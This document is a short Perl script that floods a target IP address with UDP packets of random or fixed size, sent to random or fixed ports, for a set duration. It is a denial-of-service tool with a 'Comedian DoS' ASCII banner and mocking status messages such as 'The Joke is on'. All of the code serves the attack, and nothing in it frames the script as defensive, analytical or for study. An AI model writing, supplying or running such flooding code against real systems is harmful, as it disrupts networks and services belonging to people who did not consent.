#!/usr/bin/perl

##
# amanda<----
##

use Socket;
use strict;

my ($ip,$port,$size,$time) = @ARGV;

my ($iaddr,$endtime,$psize,$pport);

$iaddr = inet_aton("$ip") or die "Unable to resolve hostname $ip\n";
$endtime = time() + ($time ? $time : 100);
socket(flood, PF_INET, SOCK_DGRAM, 17);

print <<EOTEXT;

   ____                         _ _               ____       ____   
  / ___|___  _ __ ___   ___  __| (_) __ _ _ __   |  _ \  ___/ ___|  
 | |   / _ \| '_ ` _ \ / _ \/ _` | |/ _` | '_ \  | | | |/ _ \___ \  
 | |__| (_) | | | | | |  __/ (_| | | (_| | | | | | |_| | (_) |__) | 
  \____\___/|_| |_| |_|\___|\__,_|_|\__,_|_| |_| |____/ \___/____/  

		Script Has Loaded!
	
	
EOTEXT

print "~The Joke is on~ $ip " . ($port ? $port : "random") . " 
Tango spotted" .
  ($size ? "$size-byte" : "ayy lmao where yo router at doe?") . " 
~Le Comedian~ ~Initiating Joke...~ " .
  ($time ? " for $time seconds" : "") . "\n";
print "Stop attack with Ctrl-C\n" unless $time;

for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1500000-64)+64) ;
  $pport = $port ? $port : int(rand(1500000))+1;

  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, 
$iaddr));}